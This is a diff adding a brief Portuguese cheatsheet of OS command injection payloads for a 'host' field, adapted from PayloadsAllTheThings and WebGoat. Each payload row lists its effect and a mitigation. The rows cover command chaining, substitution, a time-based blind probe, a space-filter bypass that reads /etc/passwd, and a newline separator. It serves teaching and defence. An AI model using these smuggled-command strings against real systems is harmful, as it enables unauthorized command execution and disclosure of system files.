@@ -1,0 +1,12 @@
+# OS Command Injection - cheatsheet (reimplementado de PayloadsAllTheThings/WebGoat)
+# USO SOMENTE em sistemas proprios/autorizados. Fonte:
+#   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+#
+# PAYLOAD (no campo 'host')        | EFEITO                               | MITIGACAO
+x; id                              | roda 'id' apos o comando original    | ProcessBuilder(arg list) + allowlist
+x && id                           | roda 'id' se o 1o teve sucesso       | idem
+x | id                            | encadeia via pipe                    | idem
+$(id)  /  `id`                     | substituicao de comando              | idem
+x; sleep 5                        | blind por tempo (confirma sem saida) | idem
+x;cat${IFS}/etc/passwd            | bypass de filtro de espaco (${IFS})  | allowlist, nao blacklist
+localhost%0aid                    | nova linha (CRLF) como separador     | allowlist, decodificar antes
